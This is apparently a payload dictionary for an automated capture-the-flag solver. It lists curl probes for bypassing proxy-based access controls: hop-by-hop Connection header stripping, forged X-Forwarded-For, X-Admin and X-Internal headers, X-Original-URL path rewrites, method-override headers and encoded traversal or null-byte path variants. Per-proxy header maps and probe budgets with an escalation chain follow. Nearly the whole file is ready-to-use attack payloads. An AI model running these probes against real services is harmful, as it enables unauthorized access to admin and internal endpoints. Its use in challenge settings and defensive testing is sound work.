# Payload dictionary deep — every probe, exhaustively

The full categorized dictionary of parser-differential probes and payloads.

---

## 1. The hop-by-hop Connection-strip probes — the header's names

```bash
# naming the proxy's own header in Connection — the strip probes
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'   # the proxy's client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-For'   # the forwarded header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Host'   # the forwarded host
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Proto'   # the forwarded proto
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Internal'   # the internal header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Admin'   # the admin header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Authorization'   # the auth header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Original-URL'   # the original-URL header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Rewrite-URL'   # the rewrite-URL header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-User'   # the forwarded-user header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Email'   # the forwarded-email header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Client-IP'   # the client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, True-Client-IP'   # the true-client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Server'   # the forwarded-server header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Forwarded'   # the RFC 7239 Forwarded header
```

## 2. The client-supplied proxy-header probes — a forged header

```bash
# a client-supplied proxy header — a forged header
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1, 8.8.8.8'   # a chained forwarded
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged client-IP
curl "$BASE/api/admin" -H 'True-Client-IP: 127.0.0.1'   # a forged true-client-IP
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged RFC 7239
curl "$BASE/api/admin" -H 'X-Forwarded-Host: attacker.com'   # a forged host
curl "$BASE/api/admin" -H 'X-Forwarded-Proto: http'   # a forged proto
curl "$BASE/api/admin" -H 'X-Forwarded-Scheme: http'   # a forged scheme
curl "$BASE/api/admin" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/api/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/api/admin" -H 'X-Debug: true'   # a forged debug flag
curl "$BASE/api/admin" -H 'X-Forwarded-User: admin'   # a forged user
curl "$BASE/api/admin" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
curl "$BASE/api/admin" -H 'X-Forwarded-Server: 127.0.0.1'   # a forged server
```

## 3. The path-rewrite probes — a rewritten path

```bash
# a client-supplied path-rewrite — a rewritten path
curl "$BASE/page" -H 'X-Original-URL: /admin'   # the app serves /admin under /page
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged rewrite-URL
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a forged prefix
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a forged path
curl "$BASE/page" -H 'X-Original-Path: /admin'   # a forged original-path
curl "$BASE/page" -H 'X-Real-Path: /admin'   # a forged real-path
```

## 4. The method-override probes — a forged method

```bash
# a client-supplied method-override — a forged method
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'   # a DELETE-as-POST
curl "$BASE/api" -H 'X-HTTP-Method-Override: PUT' -d 'data'   # a PUT-as-POST
curl "$BASE/api" -H 'X-HTTP-Method-Override: PATCH' -d 'data'   # a PATCH-as-POST
curl "$BASE/api" -H 'X-Original-Method: DELETE' -d 'data'   # a forged original-method
curl "$BASE/api" -H 'X-HTTP-Method: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-Method-Override: DELETE' -d 'data'   # a forged method-override
```

## 5. The normalization probes — a path the two parse differently

```bash
# a path the proxy and the app normalize differently
curl "$BASE/static/../admin"   # a traversal boundary
curl "$BASE/%2e%2e/admin"   # an encoded traversal
curl "$BASE/static/%2e%2e/admin"   # a mixed-encoding traversal
curl "$BASE/%61dmin"   # an encoded 'a' — a case/encoding boundary
curl "$BASE/%2fadmin"   # an encoded '/'
curl "$BASE/%252e%252e/admin"   # a doubly-encoded traversal
curl "$BASE/page//admin"   # a double-slash boundary
curl "$BASE/page./admin"   # a dot-slash boundary
curl "$BASE/%2f/admin"   # a leading-encoded-slash boundary
curl "$BASE/admin%20"   # a trailing-space boundary
curl "$BASE/admin%09"   # a trailing-tab boundary
curl "$BASE/admin%00"   # a trailing-null boundary
curl "$BASE/admin?"   # a trailing-? boundary
curl "$BASE/admin#"   # a trailing-# boundary
curl "$BASE/admin.html"   # a trailing-extension boundary
```

## 6. The multi-header probes — a combined injection

```bash
# a multi-header bypass — a combined injection
curl "$BASE/api/internal" -H 'X-Real-IP: 127.0.0.1' -H 'X-Internal: true'   # a local + an internal
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1' -H 'X-Admin: true'   # a local + an admin
curl "$BASE/api/user" -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-User: admin'   # a local + a user
curl "$BASE/api/debug" -H 'X-Real-IP: 127.0.0.1' -H 'X-Debug: true'   # a local + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
```

## 7. The per-vector probe map — which probe for which surface

```text
a local-vs-remote check     → a spoofed-IP header / a hop-by-hop strip
an internal-route check     → a spoofed-internal header / a hop-by-hop strip
an admin check              → a spoofed-admin header / a hop-by-hop strip
a host check                → a spoofed-host header
a scheme check              → a spoofed-scheme header
a path check                → a spoofed-path header / a normalization
a method check              → a spoofed-method header
a user check                → a spoofed-user header
a multi-proxy chain         → a chained normalization
```

## 8. The per-proxy header-map — which headers each proxy adds

```text
nginx      → X-Real-IP, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto
Traefik    → X-Real-IP, X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto
Apache     → X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto
HAProxy    → X-Forwarded-For, X-Forwarded-Host, X-Forwarded-Proto
Squid      → X-Forwarded-For
Cloudflare → CF-Connecting-IP, CF-Ray, CF-Visitor
CloudFront → X-Amzn-Trace-Id, X-Forwarded-For
Akamai     → True-Client-IP, Akamai-Origin-Hop
Varnish    → X-Forwarded-For
```

## 9. The dictionary's falsifier — when the probes are dead

```text
the card's falsifier: 'both forms are rejected, so the trust check
does not depend on that header' — the header isn't the trust check's
input → a different class.
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
```

## 10. The dictionary's budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
